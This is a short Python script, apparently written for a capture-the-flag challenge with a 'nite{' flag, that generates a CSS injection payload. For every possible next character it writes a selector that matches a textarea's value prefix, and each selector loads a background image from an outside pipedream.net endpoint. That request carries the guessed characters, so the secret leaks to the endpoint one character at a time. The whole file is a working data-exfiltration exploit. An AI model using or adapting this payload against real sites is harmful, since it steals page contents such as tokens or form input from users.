import string
import urllib.parse

ENDPOINT = "https://enmlxhlaaga2p.x.pipedream.net/"
CURR_FLAG = "nite{"
CHARSET = string.ascii_letters + string.digits + "_-{}"

css = ""

for char in CHARSET:
    css += f"""
textarea[data-last^='{CURR_FLAG + char}'] {{
    background: url("{ENDPOINT}?data={urllib.parse.quote_plus(CURR_FLAG + char)}");
}}
    """

with open("exploit.css", "w") as f:
    f.write(css)
